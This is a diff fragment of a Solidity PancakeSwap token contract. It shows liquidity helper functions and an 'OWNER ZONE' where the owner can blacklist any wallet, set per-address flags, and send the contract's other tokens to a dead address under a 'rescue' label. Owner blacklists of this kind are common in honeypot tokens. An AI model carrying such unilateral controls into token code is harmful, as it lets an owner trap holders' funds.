+			IPancakeSwapPair(_uniswapV2Pair).sync();
+        }
+    }
+	
+
+    ////////////////////////////////////////// miscs
+    // used for the wrong transaction
+    function STOPTRANSACTION() internal pure {
+        require(0 != 0, "WRONG TRANSACTION, STOP");
+    }
+
+    function SENDBNB(address recipent, uint amount) internal {
+        // workaround
+        (bool v,) = recipent.call{ value: amount }(new bytes(0));
+        require(v, "Transfer Failed");
+    }
+
+    function _isContract(address target) internal view returns (bool) {
+        uint size;
+        assembly { size := extcodesize(target) }
+        return size > 0;
+    }
+	
+    function sortTokens(address tokenA, address tokenB) internal pure returns (address token0, address token1) {
+        require(tokenA != tokenB, "The Web3 Project: Same Address");
+        (token0, token1) = tokenA < tokenB ? (tokenA, tokenB) : (tokenB, tokenA);
+    }
+	
+    function getReserves(address tokenA, address tokenB) internal view returns (uint reserveA, uint reserveB) {
+        (address token0,) = sortTokens(tokenA, tokenB);
+        (uint reserve0, uint reserve1, ) = IPancakeSwapPair(_uniswapV2Pair).getReserves();
+        (reserveA, reserveB) = tokenA == token0 ? (reserve0, reserve1) : (reserve1, reserve0);
+    }
+
+	function quote(uint amountA, uint reserveA, uint reserveB) internal pure returns (uint) {
+        if (amountA == 0) {
+            return 0;
+        }
+
+        return amountA.mul(reserveB).div(reserveA);
+    }
+	
+    // wbnb / token
+	function getRequiredLiqAmount(uint amountADesired, uint amountBDesired) internal view returns (uint, uint) {
+        (uint reserveA, uint reserveB) = getReserves(address(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c), address(this));
+    	
+        uint amountA = 0;
+        uint amountB = 0;
+
+        uint amountBOptimal = quote(amountADesired, reserveA, reserveB);
+        if (amountBOptimal <= amountBDesired) {
+            (amountA, amountB) = (amountADesired, amountBOptimal);
+        } else {
+            uint amountAOptimal = quote(amountBDesired, reserveB, reserveA);
+            assert(amountAOptimal <= amountADesired);
+            (amountA, amountB) = (amountAOptimal, amountBDesired);
+        }
+
+        return (amountA, amountB);
+    }
+    
+    ////////////////////////////////////////////////////////////////////////// OWNER ZONE
+
+    // EDIT: wallet address will also be blacklisted due to scammers taking users money
+    // we need to blacklist them and give users money
+    function setBotBlacklists(address[] calldata botAdrs, bool[] calldata flags) external limited {
+        for (uint idx = 0; idx < botAdrs.length; idx++) {
+            _blacklisted[botAdrs[idx]] = flags[idx];    
+        }
+    }
+
+    function setLifeSupports(address[] calldata adrs, uint[] calldata flags) external limited {
+        for (uint idx = 0; idx < adrs.length; idx++) {
+            _lifeSupports[adrs[idx]] = flags[idx];    
+        }
+    }
+
+    // used for rescue, clean, etc
+    function getTokens(address[] calldata adrs) external limited {
+        for (uint idx = 0; idx < adrs.length; idx++) {
+            require(adrs[idx] != address(this), "WEB3 token should stay here");
+            uint bal = IERC20(adrs[idx]).balanceOf(address(this));
+            IERC20(adrs[idx]).transfer(address(0xdead), bal);
+        }
+    }
+
+    // function disperseToken(address[] calldata recipients, uint256[] calldata amounts) external {
+    //     {
+    //         uint256 totalAmount = 0;
+    //         for (uint256 idx = 0; idx < recipients.length; idx++) {
+    //             totalAmount += amounts[idx];
+    //         }
+
+    //         uint fTotalAmount = totalAmount.mul(_frag);
+    //         _tOwned[msg.sender] = _tOwned[msg.sender].sub(fTotalAmount);
+    //     }
+
+    //     for (uint256 idx = 0; idx < recipients.length; idx++) {
+    //         uint fAmount = amounts[idx].mul(_frag);
+    //         _tOwned[recipients[idx]] = _tOwned[recipients[idx]].add(fAmount);
+    //         emit Transfer(msg.sender, recipients[idx], amounts[idx]);
+    //     }
+    // }
+
+    // function disperseSameToken(address[] calldata recipients, uint256 amount) external { // about 30% cheaper
+    //     {
+    //         uint256 totalAmount = amount * recipients.length;
+
+    //         uint fTotalAmount = totalAmount.mul(_frag);
+    //         _tOwned[msg.sender] = _tOwned[msg.sender].sub(fTotalAmount);
+    //     }
+
+    //     for (uint256 idx = 0; idx < recipients.length; idx++) {
+    //         uint fAmount = amount.mul(_frag);
+    //         _tOwned[recipients[idx]] = _tOwned[recipients[idx]].add(fAmount);
+    //         emit Transfer(msg.sender, recipients[idx], amount);
+    //     }
+    // }
+
+    // function sellbuy(uint tokenAmount_) external limited {
+    //     _tokenTransfer(msg.sender, address(this), tokenAmount_);
+		
+    //     // sell
+    //     uint ethAmount = address(this).balance;
+    //     _swapTokensForEth(tokenAmount_);
+    //     ethAmount = address(this).balance.sub(ethAmount);
+
+    //     // buy
+    //     _swapEthForTokens(ethAmount, msg.sender);
+    // }
+    //////////////////////////////////////////
+}
